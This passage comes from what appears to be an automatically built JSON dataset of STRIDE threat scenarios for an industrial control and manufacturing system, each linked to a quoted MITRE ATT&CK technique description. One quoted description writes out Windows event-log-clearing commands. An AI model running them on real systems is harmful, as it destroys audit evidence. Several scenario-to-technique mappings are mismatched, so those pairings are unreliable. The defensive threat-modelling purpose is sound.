                "description": "Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   \n\nThis technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\nAn easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\n* Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  \n* Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  \n* Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   \n* A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  \n* Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",
                "id": "attack-pattern--efbf7888-f61b-4572-9c80-7e2965c60707",
                "technique_id": "T0839"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A ransomware attack encrypts critical data in the MES, freezing production workflows.",
            "Assumptions": [
                {
                    "Assumption": "No regular data backups",
                    "Role": "IT Manager",
                    "Condition": "Lack of data redundancy"
                },
                {
                    "Assumption": "Inadequate email filtering for phishing attacks",
                    "Role": "Email Security Admin",
                    "Condition": "Insufficient email security"
                },
                {
                    "Assumption": "No user awareness training on phishing threats",
                    "Role": "Training Coordinator",
                    "Condition": "Lack of employee training"
                }
            ],
            "Potential Impact": "Production downtime and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "ransomware",
                "data encryption",
                "service disruption",
                "data loss"
            ],
            "mitre_technique": {
                "name": "Data Encrypted for Impact",
                "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)",
                "id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
                "technique_id": "T1486"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a vulnerability to gain admin rights in the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched software vulnerabilities",
                    "Role": "Patch Management Team",
                    "Condition": "Delayed software updates"
                },
                {
                    "Assumption": "Access control mechanisms are weak",
                    "Role": "System Admin",
                    "Condition": "Inadequate privilege management"
                },
                {
                    "Assumption": "No intrusion detection systems (IDS) in place",
                    "Role": "Security Engineer",
                    "Condition": "Lack of IDS"
                }
            ],
            "Potential Impact": "Unauthorized control over industrial operations.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "exploitation",
                "vulnerabilities",
                "system access"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages SQL injection to gain elevated privileges in the MES.",
            "Assumptions": [
                {
                    "Assumption": "Web application lacks input validation",
                    "Role": "Web Developer",
                    "Condition": "No input sanitization"
                },
                {
                    "Assumption": "No web application firewall (WAF) in place",
                    "Role": "Security Architect",
                    "Condition": "Lack of WAF deployment"
                },
                {
                    "Assumption": "Weak database security configurations",
                    "Role": "Database Admin",
                    "Condition": "Insecure database setup"
                }
            ],
            "Potential Impact": "Unauthorized access and control over MES data and functionality.",
            "MITRE ATT&CK Keywords": [
                "sql injection",
                "privilege escalation",
                "web application",
                "database"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user exploits configuration errors in cloud services to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured IAM policies in cloud services",
                    "Role": "Cloud Admin",
                    "Condition": "Insecure IAM configurations"
                },
                {
                    "Assumption": "Insufficient monitoring and logging of cloud activities",
                    "Role": "SOC Analyst",
                    "Condition": "Lack of activity monitoring"
                },
                {
                    "Assumption": "No regular security audits of cloud environments",
                    "Role": "Security Auditor",
                    "Condition": "Infrequent security assessments"
                }
            ],
            "Potential Impact": "Unauthorized control over cloud resources and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "cloud security",
                "privilege escalation",
                "misconfiguration",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access by impersonating a legitimate RTU.",
            "Assumptions": [
                {
                    "Assumption": "RTU lacks strong authentication mechanisms.",
                    "Role": "RTU",
                    "Condition": "The RTU is not using robust authentication methods."
                },
                {
                    "Assumption": "The attacker has network access to imitate RTU communication.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within the network or has access to the network."
                }
            ],
            "Potential Impact": "Compromise of control commands, possibly leading to unauthorized actions in the manufacturing process.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "control systems",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker hijacks a cloud service account to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service uses weak authentication mechanisms.",
                    "Role": "Cloud Service",
                    "Condition": "Cloud service lacks multi-factor authentication."
                },
                {
                    "Assumption": "Credentials can be guessed or phished.",
                    "Role": "Attacker",
                    "Condition": "The attacker can use social engineering or brute force to obtain credentials."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data, leading to potential data leakage and corruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud service",
                "credential access",
                "data leak"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a user's session to issue malicious commands via the HMI.",
            "Assumptions": [
                {
                    "Assumption": "The HMI session lacks proper session management.",
                    "Role": "HMI",
                    "Condition": "The HMI does not use strong session tokens."
                },
                {
                    "Assumption": "Attacker can intercept or guess the session token.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access or can capture session tokens."
                }
            ],
            "Potential Impact": "Unauthorized commands issued, leading to operational disruptions and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "session hijacking",
                "HMI",
                "network",
                "commands"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the firmware of the PLCs to manipulate the control logic.",
            "Assumptions": [
                {
                    "Assumption": "PLCs do not have secure firmware update mechanisms.",
                    "Role": "PLC",
                    "Condition": "Firmware updates are not signed or validated."
                },
                {
                    "Assumption": "Attacker gains physical or network access to the PLC.",
                    "Role": "Attacker",
                    "Condition": "Attacker can physically access the device or has network access."
                }
            ],
            "Potential Impact": "Compromise of control logic leading to unsafe or suboptimal operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "PLC",
                "firmware",
                "control logic"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious modification of data being transmitted between RTUs and the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Communications are not encrypted.",
                    "Role": "RTU and Control Center",
                    "Condition": "Data is transmitted in plaintext."
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access."
                }
            ],
            "Potential Impact": "Misleading data leading to incorrect control decisions or actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "communication",
                "control systems"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker injects malicious code into the MES database.",
            "Assumptions": [
                {
                    "Assumption": "No input validation or sanitation on database operations.",
                    "Role": "MES",
                    "Condition": "MES does not validate or sanitize database inputs."
                },
                {
                    "Assumption": "Attacker has access to the MES or database interfaces.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to enter or modify database queries."
                }
            ],
            "Potential Impact": "Corruption of production workflow data, leading to disrupted operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "injection",
                "control systems"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies issuing a critical command via the HMI.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and monitoring.",
                    "Role": "HMI",
                    "Condition": "HMI does not log user actions sufficiently."
                },
                {
                    "Assumption": "Commands are issued without strong authentication.",
                    "Role": "User",
                    "Condition": "The user can issue commands without multi-factor authentication."
                }
            ],
            "Potential Impact": "Difficulty in tracking the root cause of critical actions, leading to unresolved incidents and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "authentication",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies having deleted critical operational data from the cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Lack of secure audit trails in cloud services.",
                    "Role": "Cloud Storage",
                    "Condition": "Cloud service does not maintain immutable audit trails."
                },
                {
                    "Assumption": "Insufficient access controls for critical operations.",
                    "Role": "Cloud Service",
                    "Condition": "Critical operations lack robust access controls."
                }
            ],
            "Potential Impact": "Inability to recover lost data or determine the cause and responsibility for data loss.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trails",
                "cloud storage",
                "data deletion"
            ],
            "mitre_technique": {
                "name": "Data Destruction",
                "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)",
                "id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
                "technique_id": "T1485"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A technician disclaims actions taken that led to the reconfiguration of PLC settings.",
            "Assumptions": [
                {
                    "Assumption": "No detailed logging of configuration changes.",
                    "Role": "PLC",
                    "Condition": "PLC does not log all configuration changes."
                },
                {
                    "Assumption": "The technician has sufficient privileges to reconfigure without trace.",
                    "Role": "Technician",
                    "Condition": "The technician can perform actions with minimal or no traceability."
                }
            ],
            "Potential Impact": "Challenges in diagnosing issues resulting from unauthorized reconfigurations, affecting system stability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "configuration changes",
                "PLC"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive production data is intercepted during transmission to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission to the cloud is unencrypted.",
                    "Role": "Gateway",
                    "Condition": "Data is sent without encryption."
                },
                {
                    "Assumption": "Attacker has access to intercept the communication channel.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within network range to intercept the transmissions."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data, leading to potential competitive disadvantage and security risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "encryption",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider accesses sensitive data stored in MES databases without proper authorization.",
            "Assumptions": [
                {
                    "Assumption": "MES databases do not have robust access controls.",
                    "Role": "MES",
                    "Condition": "Access to the database is not adequately controlled."
                },
                {
                    "Assumption": "The insider has valid but insufficiently restricted access.",
                    "Role": "Insider",
                    "Condition": "The insider can access data due to insufficient privileges segregation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive production and operational information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "MES",
                "access control",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
